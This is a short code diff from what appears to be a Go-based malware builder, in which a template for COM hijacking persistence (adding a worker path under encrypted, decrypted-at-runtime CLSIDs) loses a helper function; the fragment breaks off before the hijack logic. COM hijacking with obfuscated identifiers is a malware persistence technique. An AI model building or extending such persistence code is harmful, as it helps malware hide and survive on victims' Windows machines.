@@ -4,10 +4,6 @@ import "strings"
 
 func templateCOMHijack() string {
 	return strings.TrimSpace(`
-func getCOMHijackCLSIDs() []string {
-	return splitDecrypt(encCOMHijackCLSIDs)
-}
-
 func addCOMHijack(workerPath string) {
 	clsids := getCOMHijackCLSIDs()
 	if len(clsids) == 0 {
